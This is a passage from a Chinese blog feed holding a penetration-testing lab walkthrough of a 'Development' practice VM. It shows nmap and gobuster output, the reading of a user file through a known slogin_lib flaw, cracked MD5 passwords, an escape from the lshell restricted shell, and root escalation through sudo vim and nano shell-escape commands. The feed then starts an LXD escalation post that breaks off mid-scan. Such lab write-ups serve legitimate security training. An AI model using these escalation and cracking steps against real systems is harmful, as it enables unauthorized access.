class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# nmap -Pn -n -sV -sC 192.168.88.129<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 20:11 EST<br>Nmap scan report for 192.168.88.129<br>Host is up (0.00029s latency).<br>Not shown: 995 closed tcp ports (reset)<br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)<br>|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 (ED25519)<br>113/tcp  open  ident?<br>|_auth-owners: oident<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>|_auth-owners: root<br>445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>|_auth-owners: root<br>8080/tcp open  http-proxy  IIS 6.0<br>|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-server-header: IIS 6.0<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Date: Tue, 12 Nov 2024 01:11:58 GMT<br>|     Server: IIS 6.0<br>|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT<br>|     ETag: &quot;230-57de32091ad69&quot;<br>|     Accept-Ranges: bytes<br>|     Content-Length: 560<br>|     Vary: Accept-Encoding<br>|     Connection: close<br>|     Content-Type: text/html<br>|     &lt;html&gt;<br>|     &lt;head&gt;&lt;title&gt;DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;p&gt;Welcome to the Development Page.&lt;/p&gt;<br>|     &lt;br/&gt;<br>|     &lt;p&gt;There are many projects in this box. View some of these projects at html_pages.&lt;/p&gt;<br>|     &lt;br/&gt;<br>|     &lt;p&gt;WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.&lt;/p&gt;<br>|     &lt;br/&gt;<br>|     &lt;br/&gt;<br>|     &lt;br/&gt;<br>|     &lt;hr&gt;<br>|     &lt;i&gt;Powered by IIS 6.0&lt;/i&gt;<br>|     &lt;/body&gt;<br>|     &lt;!-- Searching for development secret page... where could it be? --&gt;<br>|     &lt;!-- Patrick, Head of Development--&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Date: Tue, 12 Nov 2024 01:11:58 GMT<br>|     Server: IIS 6.0<br>|     Allow: OPTIONS,HEAD,GET,POST<br>|     Content-Length: 0<br>|     Connection: close<br>|     Content-Type: text/html<br>|   RTSPRequest: <br>|     HTTP/1.1 400 Bad Request<br>|     Date: Tue, 12 Nov 2024 01:11:58 GMT<br>|     Server: IIS 6.0<br>|     Content-Length: 293<br>|     Connection: close<br>|     Content-Type: text/html; charset=iso-8859-1<br>|     &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;<br>|     &lt;html&gt;&lt;head&gt;<br>|     &lt;title&gt;400 Bad Request&lt;/title&gt;<br>|     &lt;/head&gt;&lt;body&gt;<br>|     &lt;h1&gt;Bad Request&lt;/h1&gt;<br>|     &lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;<br>|     &lt;/p&gt;<br>|     &lt;hr&gt;<br>|     &lt;address&gt;IIS 6.0 Server at 192.168.88.129 Port 8080&lt;/address&gt;<br>|_    &lt;/body&gt;&lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8080-TCP:V=7.94SVN%I=7%D=11/11%Time=6732AB5F%P=x86_64-pc-linux-gnu%<br>SF:r(GetRequest,330,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2012\x20Nov\<br>SF:x202024\x2001:11:58\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\<br>SF:x20Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\&quot;230-57de3<br>SF:2091ad69\&quot;\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary<br>SF::\x20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/h<br>SF:tml\r\n\r\n&lt;html&gt;\r\n&lt;head&gt;&lt;title&gt;DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR<br>SF:\x20OUTSIDERS\x20OR\x20HACKERS!&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;p&gt;Welc<br>SF:ome\x20to\x20the\x20Development\x20Page\.&lt;/p&gt;\r\n&lt;br/&gt;\r\n&lt;p&gt;There\x20a<br>SF:re\x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20<br>SF:these\x20projects\x20at\x20html_pages\.&lt;/p&gt;\r\n&lt;br/&gt;\r\n&lt;p&gt;WARNING!\x20<br>SF:We\x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection<br>SF:\x20system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@go<br>SF:odtech\.com\.sg\.&lt;/p&gt;\r\n&lt;br/&gt;\r\n&lt;br/&gt;\r\n&lt;br/&gt;\r\n&lt;hr&gt;\r\n&lt;i&gt;Powered\<br>SF:x20by\x20IIS\x206\.0&lt;/i&gt;\r\n&lt;/body&gt;\r\n\r\n&lt;!--\x20Searching\x20for\x20<br>SF:development\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20<br>SF:--&gt;\r\n\r\n&lt;!--\x20Patrick,\x20Head\x20of\x20Development--&gt;\r\n\r\n&lt;/ht<br>SF:ml&gt;\r\n&quot;)%r(HTTPOptions,A6,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x20<br>SF:12\x20Nov\x202024\x2001:11:58\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow<br>SF::\x20OPTIONS,HEAD,GET,POST\r\nContent-Length:\x200\r\nConnection:\x20cl<br>SF:ose\r\nContent-Type:\x20text/html\r\n\r\n&quot;)%r(RTSPRequest,1CC,&quot;HTTP/1\.<br>SF:1\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2012\x20Nov\x202024\x2001:<br>SF:11:58\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20293\r\nCon<br>SF:nection:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\<br>SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//IETF//DTD\x20HTML\x202\.0//E<br>SF:N\&quot;&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;400\x20Bad\x20Request&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;<br>SF:\n&lt;h1&gt;Bad\x20Request&lt;/h1&gt;\n&lt;p&gt;Your\x20browser\x20sent\x20a\x20request\x<br>SF:20that\x20this\x20server\x20could\x20not\x20understand\.&lt;br\x20/&gt;\n&lt;/p&gt;<br>SF:\n&lt;hr&gt;\n&lt;address&gt;IIS\x206\.0\x20Server\x20at\x20192\.168\.88\.129\x20Po<br>SF:rt\x208080&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n&quot;);<br>MAC Address: 00:0C:29:25:4C:50 (VMware)<br>Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-time: <br>|   date: 2024-11-12T01:13:29<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>|   Computer name: development<br>|   NetBIOS computer name: DEVELOPMENT\x00<br>|   Domain name: \x00<br>|   FQDN: development<br>|_  System time: 2024-11-12T01:13:29+00:00<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 99.05 seconds<br></code></pre></td></tr></table></figure><p>存在的服务有很多：22：ssh,139&#x2F;445 smb ,8080: http,</p><p>个人倾向喜欢先对web服务进行踩点</p><h1 id="对目标主机服务进行信息收集"><a href="#对目标主机服务进行信息收集" class="headerlink" title="对目标主机服务进行信息收集"></a>对目标主机服务进行信息收集</h1><h2 id="8080-http"><a href="#8080-http" class="headerlink" title="8080-http"></a>8080-http</h2><p><img src="https://img.dkdun.cn/v1/2024/12/ae76b79b9bbe5447.png"></p><p>F12中还有一段注释<br><img src="https://img.dkdun.cn/v1/2024/12/6ff6d335ed3633e0.png"></p><p>这里获取到了一个用户名：Patrick。</p><p>进行目录扫描。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# gobuster dir -u http://192.168.88.129:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -b &quot;&quot; -s &quot;200,301,403&quot;<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:            http://192.168.88.129:8080<br>[+] Method:         GET<br>[+] Threads:        10<br>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Status codes:   200,301,403<br>[+] User Agent:     gobuster/3.6<br>[+] Timeout:        10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/about                (Status: 200) [Size: 936]<br>/development          (Status: 200) [Size: 576]<br></code></pre></td></tr></table></figure><h3 id="about"><a href="#about" class="headerlink" title="&#x2F;about"></a>&#x2F;about</h3><p><img src="https://img.dkdun.cn/v1/2024/12/aa5f0dbe5df0cf2f.png"><br>好像是一段介绍。</p><h3 id="development"><a href="#development" class="headerlink" title="&#x2F;development"></a>&#x2F;development</h3><p><img src="https://img.dkdun.cn/v1/2024/12/54a1c0779385f5ac.png"></p><p>给了一个test.pcap。下载下来。<br><img src="https://img.dkdun.cn/v1/2024/12/5ea1e740348aaeba.png"></p><p>用wireshark打开，在http流中发现一个php文件<br><img src="https://img.dkdun.cn/v1/2024/12/6e4eec63930566e6.png"></p><p><a href="http://192.168.254.157:8080/developmentsecretpage/directortestpagev1.php">http://192.168.254.157:8080/developmentsecretpage/directortestpagev1.php</a></p><h3 id="developmentsecretpage-directortestpagev1-php"><a href="#developmentsecretpage-directortestpagev1-php" class="headerlink" title="&#x2F;developmentsecretpage&#x2F;directortestpagev1.php"></a>&#x2F;developmentsecretpage&#x2F;directortestpagev1.php</h3><p><img src="https://img.dkdun.cn/v1/2024/12/0879841e4b82377f.png"><br>有一个弹窗，意思是：局长，有什么需要注意的？</p><p><img src="https://img.dkdun.cn/v1/2024/12/313d2a7cd2f1a2d6.png"></p><p>然后就会到页面中。</p><p><img src="https://img.dkdun.cn/v1/2024/12/b3ed44ce180c95be.png"></p><p>在这个登录界面发现，输入任意数会报错。我们查看报错的信息是什么。<br><img src="https://img.dkdun.cn/v1/2024/12/864b699eaabd5e06.png"></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;developmentsecretpage&#x2F;slogin_lib.inc.php</p><p>搜下网络上是否存在这个文件的漏洞</p><p><a href="https://www.exploit-db.com/exploits/7444?ref=benheater.com">https://www.exploit-db.com/exploits/7444?ref=benheater.com</a></p><p>通过尝试好像不能命令执行，但是下面还有一个user.txt</p><p><img src="https://img.dkdun.cn/v1/2024/12/f22766fe8b4fb92b.png"></p><p>获得了用户名与hash值<br>admin, 3cb1d13bb83ffff2defe8d1443d3a0eb<br>intern, 4a8a2b374f463b7aedbb44a066363b81<br>patrick, 87e6d56ce79af90dbe07d387d3d0579e<br>qiu, ee64497098d0926d198f54f6d5431f98</p><p><a href="https://md5.gromweb.com/?md5=87e6d56ce79af90dbe07d387d3d0579e">https://md5.gromweb.com/?md5=87e6d56ce79af90dbe07d387d3d0579e</a><br><a href="https://crackstation.net/">https://crackstation.net/</a></p><p>使用此网站进行破解<br><img src="https://img.dkdun.cn/v1/2024/12/90451fd08ad28499.png"><br><img src="https://img.dkdun.cn/v1/2024/12/237a6586e2fc8018.png"></p><p>admin，<br>intern，12345678900987654321<br>patrick，P@ssw0rd25<br>qiu，qiu</p><p>admin用户爆破不出来密码，但是在之前我们经常看见一个用户：patrick，那么就使用这个用户进行ssh登录<br>发现后面俩个用户密码都不对，使用intern吧。</p><h2 id="22-ssh"><a href="#22-ssh" class="headerlink" title="22-ssh"></a>22-ssh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# ssh intern@192.168.88.129<br>intern@192.168.88.129&#x27;s password: <br>Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-34-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue Nov 12 01:34:34 UTC 2024<br><br>  System load:  1.15               Processes:            174<br>  Usage of /:   30.9% of 19.56GB   Users logged in:      0<br>  Memory usage: 44%                IP address for ens33: 192.168.88.129<br>  Swap usage:   0%<br><br><br> * Canonical Livepatch is available for installation.<br>   - Reduce system reboots and improve kernel security. Activate at:<br>     https://ubuntu.com/livepatch<br><br>260 packages can be updated.<br>137 updates are security updates.<br><br><br>*** System restart required ***<br>Last login: Sun Nov 10 13:14:00 2024 from 192.168.88.128<br>Congratulations! You tried harder!<br>Welcome to Development!<br>Type &#x27;?&#x27; or &#x27;help&#x27; to get the list of allowed commands<br>intern:~$ id<br>Traceback (most recent call last):<br>  File &quot;/usr/local/bin/lshell&quot;, line 27, in &lt;module&gt;<br>    lshell.main()<br>  File &quot;/usr/local/lib/python2.7/dist-packages/lshell.py&quot;, line 1165, in main<br>    cli.cmdloop()<br>  File &quot;/usr/local/lib/python2.7/dist-packages/lshell.py&quot;, line 385, in cmdloop<br>    stop = self.onecmd(line)<br>  File &quot;/usr/local/lib/python2.7/dist-packages/lshell.py&quot;, line 503, in onecmd<br>    func = getattr(self, &#x27;do_&#x27; + cmd)<br>  File &quot;/usr/local/lib/python2.7/dist-packages/lshell.py&quot;, line 134, in __getattr__<br>    if self.check_path(self.g_line) == 1:<br>  File &quot;/usr/local/lib/python2.7/dist-packages/lshell.py&quot;, line 303, in check_path<br>    item = re.sub(&#x27;^~&#x27;, self.conf[&#x27;home_path&#x27;], item)<br>  File &quot;/usr/lib/python2.7/re.py&quot;, line 155, in sub<br>    return _compile(pattern, flags).sub(repl, string, count)<br>TypeError: expected string or buffer<br>Connection to 192.168.88.129 closed.<br></code></pre></td></tr></table></figure><p>输入id后报错了？报的是python的错误？</p><p>进去看看$SHELL是什么先<br><img src="https://img.dkdun.cn/v1/2024/12/73d03738be222515.png"></p><p>lshell？这是一个python限制用户命令的东西</p><p><a href="https://www.aldeid.com/wiki/Lshell?ref=benheater.com">https://www.aldeid.com/wiki/Lshell?ref=benheater.com</a></p><p><img src="https://img.dkdun.cn/v1/2024/12/e50bc4022bc2c501.png"></p><p>可以使用os.system绕过</p><p><img src="https://img.dkdun.cn/v1/2024/12/c12c074d9c5dbc9b.png"><br>这下成功了。<br>不会再被限制了。</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="普通用户提权"><a href="#普通用户提权" class="headerlink" title="普通用户提权"></a>普通用户提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">intern@development:~$ cat work.txt<br>1.      Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director&#x27;s landing page.<br><br>2.      Patrick&#x27;s start of the third year in this company!<br><br>3.      Attend the meeting to discuss if password policy should be relooked at.<br><br>intern@development:~$ cat local.txt<br>Congratulations on obtaining a user shell. :)<br></code></pre></td></tr></table></figure><p>emmmm,没什么有用的信息。且sudo -l 也需要密码。这里其实还查了计时任务：cat &#x2F;etc&#x2F;crontab</p><p>这里卡了一会，但是最终乱找的时候去网站目录看到了一个东西</p><p><img src="https://img.dkdun.cn/v1/2024/12/72bd8bdd37ee6b4e.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">intern@development:/var/www/html$ cat developmentsecretpage/directortestpagev1.php.save <br>&lt;html&gt;<br>&lt;head&gt;Tes<br><br>&lt;p&gt; Hi Director! This is the test page to provide Director with eye-catching updates. &lt;/p&gt;<br><br>&lt;p&gt; We know Director is busy and hence needs updates delivered in a timely manner.&lt;/p&gt;<br><br>&lt;p&gt; Patrick and I will routinely update this page with a pop-up that details if there is anything important.&lt;/p&gt;<br><br>&lt;script&gt;alert(&quot;Director, there is nothing for your immediate attention.&quot;);&lt;/script&gt;<br><br>&lt;!-- Director&#x27;s comments: Does this not appear to be rather silly? I think we can make use of shoutbox. --&gt;<br>&lt;!-- Patrick&#x27;s response: OK. When do you want it? --&gt;<br>&lt;!-- Director&#x27;s comments: In three months&#x27; time. --&gt;<br>&lt;!-- Patrick&#x27;s response: We are going to trial version 2 at shout.php. I think it&#x27;s more accessible to all staff members and is no longer in the developersecretpage directory.--&gt;<br>&lt;!-- Director&#x27;s comments: Approved. --&gt;<br><br>&lt;p&gt; Regards &lt;br/&gt;<br>Patrick&lt;br/&gt;<br>Head, Development Network&lt;/p&gt;<br><br>&lt;p&gt;<br>&lt;a href=&quot;&lt;?php echo $slogin_php_self.&quot;?logout=1&quot; ?&gt;&quot;&gt;Click here to log out.&lt;/a&gt;<br>&lt;/p&gt;<br><br>&lt;?php include_once ($slogin_path . &quot;footer.inc.php&quot;); ?&gt;<br></code></pre></td></tr></table></figure><p>好像也没信息0.0.</p><p>最终也是抱着试试的态度，有点脑洞可能。就是之前我们爆破出来的patrick用户的密码不能够进行ssh登录却可以su登录。</p><p>其实是在&#x2F;etc&#x2F;ssh&#x2F;sshd_config中设置了允许使用ssh登录的用户<br><img src="https://img.dkdun.cn/v1/2024/12/34c18e87b0125e28.png"></p><p>所以我们的patrick在使用ssh的时候密码错误。</p><p>那么我们现在使用su 进行提权</p><p><img src="https://img.dkdun.cn/v1/2024/12/313cebc2b5c9938a.png"></p><h2 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h2><p>接下来就是紧张刺激的root提权了</p><p><img src="https://img.dkdun.cn/v1/2024/12/93a742746000bef4.png"></p><p>有俩个，一个vim一个nano</p><h3 id="vim-提权"><a href="#vim-提权" class="headerlink" title="vim 提权"></a>vim 提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim<br>:shell<br></code></pre></td></tr></table></figure><p>即可提权<br><img src="https://img.dkdun.cn/v1/2024/12/f75996a4df380f3f.png"></p><h3 id="nano提权"><a href="#nano提权" class="headerlink" title="nano提权"></a>nano提权</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nano</span><br><span class="hljs-attribute">Ctrl</span>+R  Ctrl+X<br><span class="hljs-attribute">rest</span>; sh <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/df3adbb65efa916e.png"></p>]]></content>
    
    
    <categories>
      
      <category>cx的渗透日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Privilege Escalation with LXD</title>
    <link href="/2024/11/11/Privilege%20Escalation%20with%20LXD/"/>
    <url>/2024/11/11/Privilege%20Escalation%20with%20LXD/</url>
    
    <content type="html"><![CDATA[<p>勤劳的 cx 师傅今天又学习了，快来看看吧~</p><span id="more"></span><h1 id="探寻存活主机"><a href="#探寻存活主机" class="headerlink" title="探寻存活主机"></a>探寻存活主机</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# arp-scan -l         <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:4d:25:0e, IPv4: 192.168.88.128<br>WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.88.1    00:50:56:c0:00:08       (Unknown)<br>192.168.88.2    00:50:56:e8:d9:46       (Unknown)<br>192.168.88.130  00:0c:29:47:0d:0d       (Unknown)<br>192.168.88.254  00:50:56:e0:95:46       (Unknown)<br><br>5 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned in 2.141 seconds (119.57 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p>192.168.88.130即为我们的目标主机</p><h1 id="探寻目标主机服务"><a href="#探寻目标主机服务" class="headerlink" title="探寻目标主机服务"></a>探寻目标主机服务</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# nmap -Pn -n -sV -sC 192.168.88.130<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:38 EST<br>Nmap scan report for 192.168.88.130<br>Host is up (0.00047s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)<br>|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)<br>|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)<br>80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)<br>|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).<br>3306/tcp open  mysql   MySQL (unauthorized)<br>8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>MAC Address: 00:0C:29:47:0D:0D (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds<br></code></pre></td></tr></table></figure><p>存在ssh与sql，还有80的http，8080的http</p><h1 id="对服务进行信息收集"><a href="#对服务进行信息收集" class="headerlink" title="对服务进行信息收集"></a>对服务进行信息收集</h1><p>我个人比较倾向于先对http服务进行踩点（可能这就是web🐕吧）</p><h2 id="80-http"><a href="#80-http" class="headerlink" title="80-http"></a>80-http</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 